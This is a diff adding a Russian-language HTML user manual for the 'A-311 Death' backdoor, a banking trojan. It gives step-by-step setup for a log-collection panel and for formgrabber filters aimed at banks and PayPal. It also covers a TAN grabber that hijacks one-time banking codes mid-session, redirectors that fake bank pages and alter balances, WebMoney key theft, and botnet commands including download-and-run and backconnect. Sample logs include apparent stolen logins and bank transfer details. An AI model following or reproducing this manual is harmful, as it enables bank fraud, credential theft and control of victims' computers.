@@ -1,0 +1,220 @@
+<html><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+<center><font size=5>A-311 Death backdoor™ </font><font size=2 color=772222>(engine version 1.86.E)</font><br>
+<br><br><img src=gerb82.gif><br><br></center>
+
+<font size=2>руководство пользователя &nbsp&nbsp&nbsp( ГОСТ 19.505-79 )</font>
+<br><br><br>
+<font size=4>
+<font color=red>порядок настройки</font><br>
+<br>
+<li> - выбрать папку на сайте, где будут собираться логи (можно в корне сайта)<br>
+<li> - поместить в эту папку содержимое папки scrypts<br>
+<li> - поставить на папку logs CHMOD 777<br>
+<li> - запустить CMDMAKER.EXE, прописать путь к config.php на твоём сайте БЕЗ http://<br>
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp      (например - <font color=blue>tvoilogisait.net/folder/config.php</font>) , нажать save<br>
+<li> - настройка для сбора логов в MySQL (НЕ ОБЯЗАТЕЛЬНО)<br>
+----------------------------------------------------------------<br>
+<br>
+настройка MySQL<br>
+<br>
+создать базу, выполнить sql комманду - <br>
+<br><font size=2 color=green>
+CREATE TABLE `pass` (<br>
+  `add_date` datetime NOT NULL default '0000-00-00 00:00:00',<br>
+  `id` varchar(4) NOT NULL default '',<br>
+  `uidlog` varchar(255) NOT NULL default '',<br>
+  `ip_real` varchar(20) NOT NULL default '',<br>
+  `ip` varchar(20) NOT NULL default '',<br>
+  `pass` longtext NOT NULL,<br>
+  `form` longtext NOT NULL<br>
+) TYPE=MyISAM;<br>
+<br></font>
+прописать в mysqllog.php настройки - имя базы, логин, пароль, установить $mysql_do=1;<br>
+<br>
+----------------------------------------------------------------<br>
+       <br>
+<font color=red>настройка сервера троя</font> <br>
+<li> - запустить pconfig.exe<br>
+<li> - при первом запуске получить ключ (a311.key), поместить рядом с конфигом.<br>
+<li> - ввести путь к установленным ранее скриптам (без http:// !!!) если скрипты лежат в корне, то следует указывать domain/ (со слэшем на конце)<br><br>
+*** в архиве находится файл config_example.a3d с некоторыми предопределёнными настройками. Подгрузить его можно через "load config"<br><br>
+<li> - Proxy server's - активирует socks 4/5 + http(s) сервера.<br>
+<li> - Random proxy port's - порты, на которые будут установлены proxy сервера будут генериться случайным образом<br>
+<li> - Send passwords via http - локально собранные пароли будут отсылаться на скрипт, а не по SMTP (КРАЙНЕ РЕКОММЕНДУЕТСЯ)<br>
+<li> - Use injection - двухуровневая система обхода файерволов через сторонние процессы (КРАЙНЕ РЕКОММЕНДУЕТСЯ)<br>
+ниже указывается время в минутах - именно столько трой будет искать нужные процессы для передачи данных. (рекоммендуется 30-60 минут)<br>
+<li> - Alarm timeout - промежутки времени в минутах, через которые трой будет информировать о том, что всё ещё жив + отсылать сопутствующую информацию об открытых портах и т.п.<br>
+<li> - Open ports in offline - бэкдор будет запускаться даже если компьютер физически не подключён к internet или local network.<br>
+<li> - галочка send ___ mails - указывает трою отсылать локальные пароли. Вмесо ___ нужно ставить количество отчётов<br>
+
+
+<li> - ввести ключевые слова в фильтр формграббера<br>
+<br>
+       фильтр подразумевает фразу, слово или часть слова, которая может встретится в заголовке/адресе сайта/строке запроса<br>
+        (для того ресурса, информацию с которого следует перехватить)<br>
+<br>
+        пример - слово   gold   будет относиться к сайтам<br>
+        e-gold.com<br>
+        intgold.com<br>
+        surf4gold.org<br>
+<br>
+        при введённом слове  bank   перехватится информация например с таких сайтов -<br>
+        royalbank.com (слово встречается в адресе)<br>
+        bankreferatov.ru (тоже банк =)))<br>
+        halifax.co.uk (слово встречается в заголовке страници)<br>
+        <br>
+пример лога -<br>
+<font color=green>login_email=slash@slash.com&login_password=slash&submit.x=Log+In&form_charset=UTF-8</font> (сграбленные данные)<br>
+<font color=green>PayPal - Welcome - Microsoft Internet Explorer</font>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp(заголовок страницы)<br>
+<font color=green>http://www.paypal.com/us/ </font> &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp (данные из адресной строки)<br>
+<font color=green>[-- paypal.com/us/cgi-bin/webscr --] </font> 
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp
+(адрес, куда отправляется форма)<br>
+
+<font color=green>[Member Log-InForgot your email address?Forgot your password?Email AddressPassword]</font>&nbsp&nbsp&nbsp&nbsp&nbsp   (околоформенные слова)
+<br><br>
+<font color=green>[4654654720454065780054421]  </font> &nbsp &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp(UID (числовой идентификатор)<br>
+<font color=green>[IP:195.222.84.199 18.08.2004 00:31:42]  </font>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp(IP ; дата ; время когда произведена запись)     <br>      
+<br><br>
+======================================<br>
+<font color=red>настройка TANграббера</font><br>
+<br>
+принцип работы - трой вклинивается в https сессию и подменяет TAN, затем запоминает его и больше не даёт использовать<br>
+<br>
+танграббер настраивается путём добавления пары фильтр:имя_тана<br>
+ <br>
+ фильтр служит для идентификации сайта, где нужно перехватить TAN<br>
+ фильтр выбирается способом, аналогичным описанному выше<br>
+ имя TANа в запросе это параметр, которым передаётся TAN<br>
+ <br>
+ пример из логов - <br><br>
+ 
+ во время передачи тана в банк трой перехватывает и записыывает в лог все детали перевода вместе с таном<br>
+ в этом логе можно посмотреть каким параметром он передаётся.<br>
+ <br>
+<font color=green>Counter=9&DestinationName=barmherzige+brueder&DestinationNameExtension=&DestinationNumber=802
+<br>&DestinationBLZ=75050000&DestinationBankname=SPK+REGENSBURG&Amount=12%2C35&Description1=166680&
+<br>Description2=&Number=7457120&ExecutionDate=&NameEmployer=Herbert+Hornauer&TAN=597252&ExecuteTransfer.x=19&ExecuteTransfer.y=12<br>
+Microsoft Internet Explorer<br>
+www.vr-ebanking.de/index.php?RZBK=2669</font><br>
+ <br>
+как видно в данном случае вводятся данные перевода, сумма и "TAN=597252" т.е. имя тана в запросе "TAN"<br>
+<br>
+<font color=green>KktNrTanEnz=972549<br>
+InternetBanking - Microsoft Internet Explorer<br>
+[-- internetbanking.gad.de/banking/portal?bankid=6126 --]</font><br>
+<br>
+в данном случае  KktNrTanEnz=972549 т.е. имя тана в запросе "KktNrTanEnz"<br>
+<br>
+по умолчанию в трой вбиты некоторые конторы.<br>
+варианты - как лучше определять имена ТАНов для НОВЫХ контор (это нужно только 1 раз) -<br>
+<br>
+<li>1. наверняка имеется много логов переводов с использованными TANами. <br>
+   смотрим старые логи, цепляем оттуда имя TANа <br>
+  (в банке может быть несколько параметров, с которыми передаётся TAN в зависимости от того, где он используется)<br>
+<br>
+<li>2. самое простое - сами заходим на любой акк, вбиваем любые данные на перевод 1 евро =)<br>
+   вбиваем любой тан например 111222, смотрим каким именем он идёт в логе<br>
+      <br>
+<li>3. просмотр содержимого html страницы<br>
+   пример -<br>
+   имеется код типа<br>
+  < td class='table' nowrap='nowrap' valign='top'><br>
+   < font class="formtitle">enter TAN:< /font><br>
+< /td>< td colspan="4" nowrap="nowrap"><br>
+< input size="14" maxlength="6" tabindex="2" name="MyTaN" type="password">< /td> <br>
+<br>
+  как видно около надписи "enter TAN:" идёт edit контрол с именем MyTaN (name="MyTaN")<br>
+  <br>
+  *** второй вариант самый правильный и надёжный<br>
+<br>
+  *** за 1 перевод тащится 1 TAN<br>
+  перехваченные TANы помечаются в логе как "TAN: XXXXXX"<br><br>
+  **** настройки у отдельно взятого банка могут меняться! надо своевременно проверять это!
+<br><br>  
+  
+
+  <br><br>
+    ----------------------<br>
+почему TANы могут быть не рабочими?<br>
+<br>
+- холдер ввёл УЖЕ использованный TAN или ввёл его неточно и трой его перехватил<br>
+- холдер активировал новую карту с TANами<br>
+<br>
+TANграббер может использоваться для ЛЮБЫХ систем, где требуется РАЗОВО перехватить пароль/пин <br><br>
+======================================<br>
+<font color=red>настройка URL-редиректора</font><br>  <br> 
+  вся настройка заключается в добавлении пары "настроящий адрес"--"фальшивый адрес"<br> 
+  в поле ### указывается количество редиректов страницы с момента запуска броузера<br> 
+  *** не учитываются подгрузки страниц из кэша ; после перезапуска броузера счётчик обнуляется<br>
+  предназначен для внесения нужных изменений в html код <br> 
+  (подмена баланса, свинчивание предупреждений, добавление новых полей в формы логона или изменение их и т.д.)<br> 
+  что надо учитывать - <br> <br> 
+<li> URL указываются БЕЗ префиксов (БЕЗ http://www.)  
+<li> URL "from" надо указывать БЕЗ параметров, тоесть всё, что идёт в URL до знака вопроса<br> 
+<li> все элементы (рисунки, css, фрэймы, яваскрипты и т.п.) страницы, указанные относительными ссылками будут подгружены с ОРИГИНАЛЬНОГО САЙТА<br> 
+<li>  если надо подгрузить элемент из вне, надо прописывать его путь внутри страницы ПОЛНОСТЬЮ (http://***/****)<br> 
+<li> можно редиректить фрэймы. для этого достаточно прописать вместо основной страницы в редиректор адрес фрэйма<br> 
+<li> для удобства POST данные с оригинального URL передаются на фальшивый 
+<br> <br> 
+======================================<br>
+<font color=red>настройка доменного редиректора</font><br>  <br> 
+доменный редиректор перенаправляет ВСЕ запросы с одного домена на другой
+настройка заключается в добавлении пары "настроящий домен"--"фальшивый домен"<br> 
+<br> 
+======================================<br>
+<font color=red>работа с WebMoney</font><br>  <br> 
+данные о ключе храняться в логе в виде [kwm********************img]<br>
+для расшифровки используется декриптор, в результате чего на диске создаётся .kwm файл со случайным именем <br>
+(само имя файла, а также WMID и пароль к которому принадлежит файл записываются текстом)<br>
+  <br><br>
+
+======================================     <br>
+<font color=red>сборка сервера троя</font><br>  <br> 
+- нажать save, сохранить сервер троя под любым именем   <br>
+*** кнопки save/load config позволяют подгружать или сохранять заранее приготовленную конфигурацию<br>
+<br>
+======================================     <br>
+<font color=red>установка комманд<br></font>
+в нужное время с помощью CMDMAKER.EXE можно подавать комманды ботам<br>
+CMDMAKER.EXE формирует комманды и передаёт их скрипту<br>
+боты периодически опрашивают скрипт и получают эти комманды<br>
+<br>
+для контроля выполнения комманды всеми ботами или конкретным ботом <br>
+ОБЯЗАТЕЛЬНО нужно выбрать All UID или конкретный UID, нажать set uid<br>
+можно прописать подряд несколько UID'ов<br>
+затем подтвердить, нажав confirm - после этого откроются сами комманды<br>
+<br><br>
+<li> download+run - качает и запускает файл<br>
+<br>
+<li> new******** - обновление настроек из *.a3d файлов (соотв. файлы генеряться кнопкой create a3d files в конфиге)<br>
+<br>
+<li> set search page - устанавливает новую страницу поиска в windows<br>
+<br>
+<li> set home page - устанавливает новую стартовую страницу в windows<br>
+<br>
+<li> null TAN table - обнуляет таблицу перехваченных троем ТАНов (трой хранит отдельно для каждой конторы записи - сколько и какие ТАНЫ были перехвачены, для дальнейшего их блокирования). После этого трой будет собирать ТАНы заново.<br>
+<br>
+<li> backconnect (трой коннэктится к клиенту) - используется для получения доступа к компам в локалке <br>
+для запуска backconnect'a - <br>
+запустить client.exe , выбрать любой свободны порт, нажать backconnect, свернуть клиент в трей.<br>
+в коммандах - указывается XXIP:PORT куда он должен сконнэктится, где XX - количество попыток соединения, IP - реальный! IP того компьютера, где запущен клиент и PORT это тот порт, который был введён в клиенте<br>
+нажать в панели комманд кнопку backconnect.<br><br>
+Справа панели сформированные комманды можно редактировать вручную.
+<br><br>
+
+
+<br>
+load from web подгружает уже сохранённые комманды<br>
+save сохраняет комманды - после введения комманда их надо СОХРАНИТЬ!!!<br>
+</font>
+<br><br><br><br>
+<font size=2 color=5555BB>Corpse software© 2001-2005<br><a href="http://prodexteam.net">http://prodexteam.net</a><br>ICQ: #670045</font>
+<br><br>-------------------------------------------------------------------------------<br> EOF
+</html>
